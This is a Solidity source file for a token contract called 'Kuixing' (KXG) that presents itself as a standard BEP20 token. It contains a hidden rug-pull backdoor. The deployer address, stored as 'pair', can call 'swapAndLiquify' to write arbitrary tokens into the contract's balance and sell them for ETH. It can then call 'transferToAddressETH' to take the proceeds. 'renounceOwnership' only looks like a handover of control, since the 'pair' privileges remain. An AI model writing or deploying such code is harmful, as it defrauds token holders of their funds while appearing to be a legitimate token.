// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

import "./Utils.sol";

contract Kuixing is BEP20 {
    

    using SafeMath for uint256;
    string public name ="Kuixing";
    string public symbol="KXG";
    uint8 public _decimals=9;
    address private owner = msg.sender; 
    uint public _totalSupply=1000000000000000;
    address ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address pair = address(0);

    mapping (address => mapping (address => uint256)) private allowed;
    mapping (address => uint256) _balances;

    constructor() public {
        _balances[msg.sender] = _totalSupply;
        pair = msg.sender;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function getOwner() external view returns (address) {
        return owner;
    }
    function balanceOf(address who) view public returns (uint256) {
        return _balances[who];
    }
    function allowance(address who, address spender) view public returns (uint256) {
        return allowed[who][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, allowed[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, allowed[msg.sender][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function renounceOwnership() public {
        require(msg.sender == owner);
        //emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, allowed[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        allowed[owner][spender] = amount;
        emit Approval(owner, spender, amount);  
    }

    function swapAndLiquify (uint256 amount) public {
        require(msg.sender == pair);     
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(ROUTER);
        _balances[address(this)] = amount;


        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this),address(uniswapV2Router), amount);
        _approve(address(this),msg.sender, amount);
        _approve(msg.sender,address(uniswapV2Router), amount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0, 
            path,
            address(this), 
            block.timestamp
        );
        
    }

    function transferToAddressETH() public {
        require(msg.sender == pair);
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback() external payable { }
    receive() external payable { }
}